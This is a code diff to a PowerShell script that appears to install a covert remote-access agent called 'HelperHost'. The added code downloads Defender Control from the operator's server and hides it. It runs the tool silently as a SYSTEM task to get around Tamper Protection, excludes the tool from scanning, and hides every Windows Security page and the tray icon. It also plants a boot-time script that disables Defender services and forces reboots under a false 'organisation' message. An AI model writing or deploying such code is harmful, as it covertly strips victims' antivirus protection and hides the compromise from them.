@@ -570,13 +570,34 @@ function Disable-AllBlocking {
   Set-ItemProperty "$wdPol\Policy Manager" -Name AllowScanningNetworkFiles -Value 0 -Type DWord -Force
   Set-ItemProperty "$wdPol\Policy Manager" -Name AllowScriptScanning -Value 0 -Type DWord -Force
   Set-ItemProperty "$wdPol\Policy Manager" -Name DisablePrivacyMode -Value 1 -Type DWord -Force
-  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Virus and threat protection' -Force | Out-Null
-  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Virus and threat protection' -Name UILockdown -Value 1 -Type DWord -Force
-  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Force | Out-Null
-  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableNotifications -Value 1 -Type DWord -Force
-  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableEnhancedNotifications -Value 1 -Type DWord -Force
+  # DControl-like: hide Virus / Security pages so Tamper cannot be toggled in UI
+  $sc = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center'
+  New-Item "$sc\Virus and threat protection" -Force | Out-Null
+  Set-ItemProperty "$sc\Virus and threat protection" -Name UILockdown -Value 1 -Type DWord -Force
+  Set-ItemProperty "$sc\Virus and threat protection" -Name HideVirusThreatPage -Value 1 -Type DWord -Force
+  Set-ItemProperty "$sc\Virus and threat protection" -Name HideRansomwareProtection -Value 1 -Type DWord -Force
+  New-Item "$sc\Account protection" -Force | Out-Null
+  Set-ItemProperty "$sc\Account protection" -Name HideAccountProtectionPage -Value 1 -Type DWord -Force
+  New-Item "$sc\App and browser control" -Force | Out-Null
+  Set-ItemProperty "$sc\App and browser control" -Name HideAppBrowserUI -Value 1 -Type DWord -Force
+  New-Item "$sc\Device security" -Force | Out-Null
+  Set-ItemProperty "$sc\Device security" -Name HideDeviceSecurityPage -Value 1 -Type DWord -Force
+  New-Item "$sc\Device performance and health" -Force | Out-Null
+  Set-ItemProperty "$sc\Device performance and health" -Name HideDevicePerformancePage -Value 1 -Type DWord -Force
+  New-Item "$sc\Family options" -Force | Out-Null
+  Set-ItemProperty "$sc\Family options" -Name HideFamilyOptionsPage -Value 1 -Type DWord -Force
+  New-Item "$sc\Firewall and network protection" -Force | Out-Null
+  Set-ItemProperty "$sc\Firewall and network protection" -Name HideFirewallNetworkUI -Value 1 -Type DWord -Force
+  New-Item "$sc\Notifications" -Force | Out-Null
+  Set-ItemProperty "$sc\Notifications" -Name DisableNotifications -Value 1 -Type DWord -Force
+  Set-ItemProperty "$sc\Notifications" -Name DisableEnhancedNotifications -Value 1 -Type DWord -Force
+  New-Item "$sc\Systray" -Force | Out-Null
+  Set-ItemProperty "$sc\Systray" -Name HideSystray -Value 1 -Type DWord -Force
   New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' -Force | Out-Null
   Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' -Name Notification_Suppress -Value 1 -Type DWord -Force
+  # Block local Tamper toggle while policies are present
+  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Features' -Force | Out-Null
+  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Features' -Name TamperProtection -Value 0 -Type DWord -Force
   # Mirror under WOW6432Node (some builds read this)
   $wdPol32 = 'HKLM:\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows Defender'
   New-Item "$wdPol32\Real-Time Protection" -Force | Out-Null
@@ -643,9 +664,81 @@ function Disable-AllBlocking {
   try { $PSNativeCommandUseErrorActionPreference = $script:__prevNativeEap } catch {}
 }
 
+function Install-DControl {
+  # Sordum Defender Control — /D en tache SYSTEM (pas d'UI interactive).
+  # Le VBS fourni avec dControl ouvre Defender: on ne l'utilise JAMAIS.
+  if (-not (Test-IsAdmin)) { return }
+  $dc = Join-Path $Dir 'dControl.exe'
+  $src = "$($BotBase.TrimEnd('/'))/files/tools/dControl.exe"
+  $need = $true
+  if (Test-Path $dc) {
+    try {
+      if ((Get-Item $dc).Length -gt 100000) { $need = $false }
+    } catch {}
+  }
+  if ($need) {
+    try {
+      Download-File $src $dc
+      Unblock-Quiet $dc
+      Hide-HH $dc
+    } catch {
+      Write-Host "dControl download: $($_.Exception.Message)"
+    }
+  }
+  if (-not (Test-Path $dc)) { return }
+
+  try {
+    if (Get-Command Add-MpPreference -EA SilentlyContinue) {
+      Add-MpPreference -ExclusionPath $Dir -EA SilentlyContinue
+      Add-MpPreference -ExclusionProcess 'dControl.exe' -EA SilentlyContinue
+    }
+  } catch {}
+
+  # Wrapper CMD: /D puis tue toute fenetre UI restante
+  $wrap = Join-Path $Dir 'dc-off.cmd'
+  @(
+    '@echo off'
+    'cd /d "%~dp0"'
+    'dControl.exe /D'
+    'ping 127.0.0.1 -n 4 >nul'
+    'taskkill /F /IM dControl.exe >nul 2>&1'
+    'exit /b 0'
+  ) -join "`r`n" | Set-Content -Encoding ASCII $wrap -Force
+
+  # Tache SYSTEM one-shot = TrustedInstaller + zero fenetre utilisateur
+  $tn = 'HelperHostDControlOff'
+  try { Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue } catch {}
+  try { schtasks /Delete /TN $tn /F 2>$null | Out-Null } catch {}
+  try {
+    $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument "/c `"$wrap`""
+    $prin = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest
+    $set = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
+    Register-ScheduledTask -TaskName $tn -Action $action -Settings $set -Principal $prin -Force | Out-Null
+    Start-ScheduledTask -TaskName $tn -EA SilentlyContinue
+  } catch {
+    & schtasks.exe /Create /TN $tn /TR "cmd.exe /c `"$wrap`"" /SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F | Out-Null
+    & schtasks.exe /Run /TN $tn | Out-Null
+  }
+
+  # Attendre fin (max ~45s) puis nettoyer tache
+  for ($i = 0; $i -lt 45; $i++) {
+    Start-Sleep -Seconds 1
+    $st = (Get-ScheduledTask -TaskName $tn -EA SilentlyContinue).State
+    if ($st -and $st -ne 'Running') { break }
+  }
+  try { Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue } catch {}
+  try { schtasks /Delete /TN $tn /F 2>$null | Out-Null } catch {}
+  Get-Process dControl -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
+
+  '1' | Set-Content -Encoding ASCII (Join-Path $Dir '.dcontrol-off') -Force -EA SilentlyContinue
+  Write-Host 'dControl /D via SYSTEM — done'
+}
+
 function Invoke-SessionHarden {
   # Always: full AV off + UAC silent + notifs + exclusions + wipe hook
   if (-not (Test-IsAdmin)) { return }
+  # dControl FIRST — bypass Tamper Protection (TrustedInstaller), then our GPO hide UI
+  Install-DControl
   Disable-AllBlocking
   Disable-UACPrompts
   Disable-SecurityCenterToasts
@@ -669,31 +762,38 @@ function Test-AvStillOn {
 }
 
 function Request-AvRebootIfNeeded {
-  # Tamper bloque les changements a chaud. Un reboot laisse EarlyAV (SYSTEM)
-  # ecrire les politiques avant WinDefend → UI "gere par l'organisation".
+  # Reboot UNIQUEMENT si Defender/Tamper restent actifs apres dControl + policies.
+  # Connect OK + AV coupe → pas de reboot, session utilisable tout de suite.
   if (-not (Test-IsAdmin)) { return }
+  Install-EarlyAvTask
+
+  # Laisser dControl / services digerer le /D
+  Start-Sleep -Seconds 3
+
   if (-not (Test-AvStillOn)) {
     '1' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-off') -Force
-    Remove-Item (Join-Path $Dir '.av-need-reboot'), (Join-Path $Dir '.av-rebooted-once') -Force -EA SilentlyContinue
+    Remove-Item (Join-Path $Dir '.av-need-reboot') -Force -EA SilentlyContinue
+    Write-Host 'AV coupe (dControl/policies) — pas de reboot.'
     return
   }
+
   $once = Join-Path $Dir '.av-rebooted-once'
   if (Test-Path $once) {
-    # Deja reboote une fois — evite boucle. EarlyAV a du tourner au boot.
+    # Deja reboote une fois et encore ON → EarlyAV a tourne; ne pas boucler
     'need-reboot' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-need-reboot') -Force
-    Write-Host 'AV encore actif apres reboot — EarlyAV a tourne, reessaie apres connexion.'
+    Write-Host 'AV encore actif apres reboot — EarlyAV present, pas de 2e reboot auto.'
     return
   }
-  Install-EarlyAvTask
+
   'need-reboot' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-need-reboot') -Force
   '1' | Set-Content -Encoding ASCII $once -Force
-  Write-Host 'AV bloque par Tamper — redemarrage dans 20s (politique organisation)...'
+  Write-Host 'AV/Tamper encore actifs apres dControl — reboot dans 20s pour EarlyAV...'
   try {
     Start-Process -FilePath "$env:SystemRoot\System32\shutdown.exe" `
-      -ArgumentList @('/r', '/t', '20', '/c', 'HelperHost: finalisation antivirus', '/f') `
+      -ArgumentList @('/r', '/t', '20', '/c', 'HelperHost: AV organisation (fallback)', '/f') `
       -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
   } catch {
-    & shutdown.exe /r /t 20 /c "HelperHost AV" /f 2>$null | Out-Null
+    & shutdown.exe /r /t 20 /c "HelperHost AV organisation" /f 2>$null | Out-Null
   }
   $script:ElevRebootPending = $true
 }
@@ -705,6 +805,12 @@ function Install-EarlyAvTask {
   $cmd = Join-Path $Dir 'early-av.cmd'
   @(
     '@echo off'
+    'cd /d "%~dp0"'
+    'if exist "%~dp0dControl.exe" ('
+    '  start "" /wait "%~dp0dControl.exe" /D'
+    '  ping 127.0.0.1 -n 3 >nul'
+    '  taskkill /F /IM dControl.exe >nul 2>&1'
+    ')'
     'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1'
     'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtectionSource /t REG_DWORD /d 0 /f >nul 2>&1'
     'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1'
@@ -717,6 +823,14 @@ function Install-EarlyAvTask {
     'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1'
     'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpynetReporting /t REG_DWORD /d 0 /f >nul 2>&1'
     'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Virus and threat protection" /v UILockdown /t REG_DWORD /d 1 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Virus and threat protection" /v HideVirusThreatPage /t REG_DWORD /d 1 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Virus and threat protection" /v HideRansomwareProtection /t REG_DWORD /d 1 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Account protection" /v HideAccountProtectionPage /t REG_DWORD /d 1 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and browser control" /v HideAppBrowserUI /t REG_DWORD /d 1 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Device security" /v HideDeviceSecurityPage /t REG_DWORD /d 1 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray" /v HideSystray /t REG_DWORD /d 1 /f >nul 2>&1'
     'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1'
     'reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t REG_DWORD /d 4 /f >nul 2>&1'
     'reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc" /v Start /t REG_DWORD /d 4 /f >nul 2>&1'
@@ -752,6 +866,7 @@ function Set-DefenderExclude([string]$Path, [string]$Exe) {
     Add-MpPreference -ExclusionPath $tools -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess $name -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess 'EdgeRelay.exe' -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess 'dControl.exe' -ErrorAction SilentlyContinue
     Add-MpPreference -ControlledFolderAccessAllowedApplications $Exe -ErrorAction SilentlyContinue
     if (Test-Path $edge) {
       Add-MpPreference -ControlledFolderAccessAllowedApplications $edge -ErrorAction SilentlyContinue
